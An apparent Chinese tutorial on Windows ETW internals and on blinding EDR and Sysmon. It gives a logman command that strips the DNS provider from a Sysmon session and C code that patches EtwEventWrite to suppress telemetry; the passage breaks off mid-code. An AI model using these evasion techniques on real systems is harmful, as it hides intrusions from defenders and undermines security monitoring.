---
title: Windows ETW攻击
url: https://mp.weixin.qq.com/s/P-a__39hMbVXTIwxdrM2RA
source: Doonsec's feed
date: 2026-03-22
fetch_date: 2026-03-23T04:22:59.919942
---

# Windows ETW攻击

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfM9YsiaznR2P7qqziaKkVUsLLYn7k6o5Zfv3XI3AFmzhJVcPo0vX94qCqwzgqXCqRiaAJUEftVRPhyFXw2iahBAibicqyPyNV0zFMf5g/0?wx_fmt=jpeg)

# Windows ETW攻击

南陈
南陈

泷羽Sec

![]()

在小说阅读器中沉浸阅读

微软将ETW定义为操作系统提供的通用，高速追踪设施。这意味着它允许`Windows`从用户模式应用程序和内核模式驱动程序中收集详细的事件数据，ETW使用缓冲和日志记录机制，为用户模式应用程序和内核模式驱动程序生成的事件提供追踪功能。 由于ETW提供了传输遥测数据的安全通道，这使得EDR及其依赖于它。这些遥测数据有助于EDR来进行有效的检测记录和响应威胁。

#### Etw简介

微软将ETW定义为操作系统提供的通用，高速追踪设施。这意味着它允许`Windows`从用户模式应用程序和内核模式驱动程序中收集详细的事件数据，ETW使用缓冲和日志记录机制，为用户模式应用程序和内核模式驱动程序生成的事件提供追踪功能。

由于ETW提供了传输遥测数据的安全通道，这使得EDR及其依赖于它。这些遥测数据有助于EDR来进行有效的检测记录和响应威胁。

源：https://forum.butian.net/index.php/share/4823

作者：南陈

#### Etw基本了解

**所以如果我们可以破坏ETW，那么就可以直接让EDR致盲。**

ETW主要有4个大模块，分别是提供者，消费者，Session会话，控制器。

首先来看一下**ETW的提供者**，**ETW提供者负责生成事件并将其写入到ETW追踪会话中。**`Windows`系统中本身已经有内核提供者，但不仅限于此。用户应用程序也可以定义自己的提供者，并配有独特的事件。

**消费者是用于消费ETW追踪会话中的事件**，一般消费者会订阅ETW追踪会话然后开始实时工作。**除了订阅ETW追踪会话之外，也可以通过读取日志进行工作**。消费者可以是由用于或应用程序来创建的。**一个消费者可以订阅多个ETW追踪会话。**

**控制器是用于控制启动和停止ETW追踪会话以及控制那些事件的流出和设置存储事件数据的日志文件。**

控制器还负责处理会话缓冲区，并追踪统计数据，例如使用了多少缓冲区，已传递或丢失了多少数据。

现在让我们使用`logman`工具来查询`ETW`提供者。如果要获取内置`ETW`提供者的数量可以使用如下命令:

```
logman query providers | find /c /v ""
```

如下我们得知`ETW`提供者的数量为`1175`个。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfNTHeFiaQicL7qSZZSCSDoOsYgmKhF3Nq4ImP8Dfic7nhcKwCdOJM5wXubcMibUXmmzEdaEthA89uOB3h21jBqfrHhCkHWTs0LhxMA/640?wx_fmt=png&from=appmsg)现在我们来列出所有内置的`Etw`提供程序以及`Guid`。

```
logman query providers
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfPzIDqEPvjotJzOLteEMJOdTsJYmz6FTnNtH1BHiahNIE8PKsosNbloFs2n78Jk2zygYoqXR1DWFstF8ibaeDkLHe53AU1IatSYA/640?wx_fmt=png&from=appmsg)

image.png

当我们得到`Etw`提供者之后，我们现在专注于查找特定提供者所发出的事件，从它所发出的事件我们可以得知该提供者正在监控那些活动。可以通过如下命令查询:

```
logman query providers <提供者名称>
```

在如下示例中我们正在查询`Microsoft-Windows-Threat-Intelligence`，以及该提供者所具备的功能，该提供者会记录本地进程和远程进程中的内存分配以及内存保护事件。

![image.png](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfNMXOOwwIGRbdrKe9omCK24AgdZ3LeuvGjV8Yan0Fj4TXpghMibzZDSjZVyhwAVoU7icN6JLaTiaB9jvhteKnaeb8KfPsHJ3xyAbo/640?wx_fmt=png&from=appmsg)

image.png

接下来我们来查询`Etw`追踪会话。这些会话用于实时收集遥测数据。如下命令列出了`Etw`追踪会话以及是否正在运行。

```
logman query -ets
```

如下图中有我们熟悉的`Sysmon`追踪会话，它使用了两个会话，分别是`Sysmon-Trace`和`SysmonDnsEtwSession`，`Sysmon-Trace`追踪会话正在捕获由`Sysmon`驱动程序发送的内核回调中的系统监控数据，比如进程的创建，线程的创建，映像的加载，注册表修改，对象操作以及微过滤器等操作。这些遥测数据最终都会被写入到`Sysmon-Trace`追踪会话中。

还有一个是`SysmonDnsEtwSession`追踪会话，该追踪会话用于收集`DNS`遥测数据。该提供者可以使用`logman`工具在用户模式下禁用。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfOqovT8ql9siaicgTDh1OOMDGo1pcESdcQj3mHvBpvJ3xic1IcJKEm34hKM59pUCTdRiaxluypeGSDdEkcujESlFwUicVMibKIrmA2N0/640?wx_fmt=png&from=appmsg)

image.png

需要注意的是一些EDR会隐藏它们的追踪会话。所以它们会保护自己的会话，例如`Windows Defender`，我们不会在`logman`的输出中看到它们，它们有`DefenderAuditLogger`和`DefenderAPILogger`这些会话。它们没有出现在`logman`的输出中是因为它们受到了保护，阻止用户模式下访问。

现在我们列出指定的追踪会话中的`Etw`提供者。

如下实例中，我们列出了`SysmonDnsEtwSession`会话中的提供者。可以看到如下图中`Microsoft-Windows-DNS-Client`是`SysmonDnsEtwSession`会话的提供者。这意味着会话通过`Microsoft-Windows-DNS-Client`提供者来收集`DNS`遥测数据。

```
logman query SysmonDnsEtwSession -ets
```

![image.png](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfMBC8qc873ucsLUhlEuiaDq7S8LxSeXJzWdYe1W5bNhZUU6J4DoiapNiase2ZZqfmgKKDOBmmjjGl4HtG9A1mr650ibMicow5c0VV6U/640?wx_fmt=png&from=appmsg)

image.png

现在让我们来看看如何从用户模式中禁用`Etw`提供者。

在这之前我们需要了解一下**普通**的`ETW`提供者和**安全**的`Etw`提供者的区别，普通`Etw`提供者可以从用户模式访问和修改，它们很容易遭到篡改或禁用。`EDR`使用的安全`Etw`提供者受到用户模式的保护，如果没有`Protected Process Light(PPL)`方式运行的服务或进程，则无法轻易禁用或查询。

因此如果我们要禁用普通的`Etw`提供者，我们可以使用如下命令:

```
logman update trace <会话名称> --p <提供者名称> -ets
logman update trace SysmonDnsEtwSession --p Microsoft-Windows-DNS-Client -ets
```

如下图当我们禁用之后，我们重新查询`SysmonDnsEtwSession`追踪会话，其中已经没有`Etw`提供程序了。

当禁用之后，`Sysmon`将不会再获取`DNS`遥测数据。

![image.png](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfMQOKbyP3uKjU5f43ErA4q74cBg3Kz1rlHDQlCEWyibFrCC8wIk37j8Nkvy95zVoyMmnWjscWqZ5aMKnb1MibQMDN91yIsdXxIrE/640?wx_fmt=png&from=appmsg)

image.png

现在我们将使用如下`Javascript`脚本来枚举所有`Etw`提供者，包括那些安全的提供者，对于每一个`Etw`提供者，它将显示正在从中收集`Etw`事件的会话，以及正在向该会话写入事件的提供者。

```
https://github.com/trailofbits/WinDbg-Js/blob/main/EtwKernelRoutines.js
```

然后使用如下命令来枚举出系统中所有的`ETW`消费者及其会话，以及将事件写入这些会话的`ETW`提供者。

```
dx @$cursession.Processes.Select(p=> @$scriptContents.EtwConsumersForProcess(p))
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfOicCE99PosUed3ynxE0VXlEJbQVMEQQoFVt0XcTCAHNhvNsbY5iaNC6Z8gBHPEso2cap5BOibE96deDelhClehTSiagtnl82EKZibk/640?wx_fmt=png&from=appmsg)

image.png

如上图中`svchost.exe`作为`Etw`消费者，而追踪会话的名称为: `UBPM`，`Etw`提供程序用于产生遥测数据，最终会将遥测数据写入到`UBPM`追踪会话中，由`svchost.exe`来进行消费。

如果我们想要枚举特定进程的`Etw`信息，则需要指定`Pid`。

例如查看`Sysmon`进程的。

```
dx @$scriptContents.EtwConsumersForProcess(@$cursession.Processes.Where(p => p.Id == 0x8dc).First())
```

可以看到`Sysmon`有两个追踪会话，`SysMon TRACE`追踪会话并没有`Etw`提供程序。但`SysmonDnsEtwSession`有一个`Etw`提供程序为: `{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}`。

![image.png](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfMlpkfgzKbdYHhxicb9pQfwliaR0AqPdLgNxXJlpicZ9qDJabUZicP8SwGepWZQoDD7FWhCHEWvunbnmzzMBZSBJzDMAedYHVbrSkU/640?wx_fmt=png&from=appmsg)

image.png

我们来看看该`Guid`对应的是那个`Etw`提供程序。

```
logman query providers {1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}
```

可以看到我们发现该`Guid`其实对应的就是`Microsoft-Windows-Dns-Client`。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfO4XeWmUnNkLzbE2X6yXm3CN2ePRAQ1zmahPjE0niau1BeLxo17CtavGoLpDA5vugRZKDY8BC12hmpO2qdsB9JMEJD8wc9w8KEE/640?wx_fmt=png&from=appmsg)

image.png

那么我们按照之前所说的我们对其进行移除。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfOBduNicic8hy8ib5u3SLmGpT23M9BJINgZmhDLvf2Kqzl5rga7amgpZ4PGMicOUGk43JTryRXj3kSF6AxBVCEiaq4wcrJJicopbeEWY/640?wx_fmt=png&from=appmsg)

image.png

现在比如说我们打开一个网站，这时候`Sysmon`就不会捕获`DNS`相关的数据了。

#### 用户层Bypass ETW

现在我们来看看如何通过修补`EtwEventWrite`API函数来禁用用户模式`Etw`提供程序事件生成。该`Api`函数被用户模式`Etw`提供程序用来将用户模式事件写入`EDR`消费者所在的会话中，以便检测我们的恶意操作，比如进程中是否正在加载`.Net`脚本，或者加载恶意的`.Net`程序集。

所以首先第一步是通过`GetModuleHandle`配合`GetProcAddress`函数来获取到`EtwEventWrite`的地址。`EtwEventWrite`函数是在`Ntdll`模块中导出的。

第二步我们需要修改它的保护属性，将其它的属性从`RX`可读可执行更改为`RW`可读可写。这里将使用`VirtualProtect`函数来将`EtwEventWrite`的内存保护从`PAGE_EXECUTE_READ`更改为`PAGE_EXECUTE_READWRITE`。

在最后一步中，我们就需要来修补`EtwEventWrite`函数的开头，写入`0x48,0x33,0xc0,0xc3`操作码。该操作码表示`xor rax,rax``ret`。`xor rax rax`指令会将`rax`寄存器清零，在`Windows API`调用约定中，`RAX`寄存器中的值用于存储返回值，也就是说我们让该函数直接返回`0`，也就是调用成功。

如下代码:

```
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS (NTAPI*  fnNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtection,
    OUT PULONG OldProtection
);
typedef NTSTATUS (NTAPI* fnNtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
void PatchEtw(HANDLE hProcess) {
    //获取到EtwEventWrite函数地址
    HMODULE NtdllModule = GetModuleHandleA("ntdll.dll");
    PVOID pAddress = GetProcAddress(NtdllModule,"EtwEventWrite");

    //定义Patch的字节 //xor rax rax ret
    char etwPath[] = { 0x48,0x33,0xc0,0xc3 };

    PVOID baseAddress = pAddress; // 需要一个变量来存放地址
    SIZE_T regionSize = 4; // 明确指定 Patch 大小
    ULONG oldProtect = 0;

    //获取到NtProtectVirtualMemory函数地址和NtWriteVirtualMemory地址
    fnNtWriteVirtualMemory NtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(NtdllModule, "NtWriteVirtualMemory");
    fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(NtdllModule, "NtProtectVirtualMemory");

    //修改EtwEventWrite保护属性
    DWORD OldProtect = NULL;
    NTSTATUS status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    //写入修补字节
    SIZE_T NumberOfBytes = NULL;
    NtWriteVirtualMemory(hProcess, pAddress, (PVOID)etwPath, sizeof(etwPath),&NumberOfBytes);
    //将保护权限改回来
    NTSTATUS status1 = NtProtectVirtualMemory(
        hProcess,
        &baseAddres...